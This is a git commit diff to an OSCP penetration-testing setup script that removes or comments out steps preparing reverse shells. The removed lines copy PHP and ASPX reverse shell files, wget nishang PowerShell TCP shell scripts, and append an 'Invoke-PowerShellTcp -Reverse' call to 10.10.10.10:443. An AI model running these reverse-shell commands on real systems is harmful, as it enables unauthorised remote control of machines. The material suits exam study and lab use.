c02038e091d23323855c8a4448f7bbf685527bdc
Michel <michel@woodenshoe.org>
2021-09-12 17:34:09 +0200

    update remove reverse shell download

--- install/oscp/update.sh
+++ install/oscp/update.sh
@@ -26,12 +26,6 @@ git pull >/dev/null
 ################################################################
 cd ~
 rm -rf -d enum
-mkdir enum 2>/dev/null
-cd enum
-
-#add start python web server script:
-echo "sudo python3 -m http.server 6680" > start-pythonwebserver.sh
-chmod +x start-pythonwebserver.sh
 
 ################################################################
 # Refresh Recon
@@ -52,24 +46,15 @@ cp ~/black-badge/install/oscp/script . -r
 ################################################################
 cd ~
 rm -rf -d reverse-shell
-mkdir reverse-shell 2>/dev/null
-cd reverse-shell
-cp ~/black-badge/K/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
-cp ~/black-badge/K/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
-wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
-wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
-echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1
+#mkdir reverse-shell 2>/dev/null
+#cd reverse-shell
 
-echo "git clone https://github.com/interference-security/kali-windows-binaries.git 2>/dev/null" > download-kali-windows.sh
-chmod +x download-kali-windows.sh
+#echo "git clone https://github.com/interference-security/kali-windows-binaries.git 2>/dev/null" > download-kali-windows.sh
+#chmod +x download-kali-windows.sh
 
 #add start python web server script:
-echo "sudo python3 -m http.server 6443" > start-pythonwebserver.sh
-chmod +x start-pythonwebserver.sh
-
-#add download nishang script
-echo "git clone https://github.com/samratashok/nishang.git 2>/dev/null" > download-nishang.sh
-chmod +x download-nishang.sh
+#echo "sudo python3 -m http.server 6443" > start-pythonwebserver.sh
+#chmod +x start-pythonwebserver.sh
 
 ################################################################
 # Refresh ip
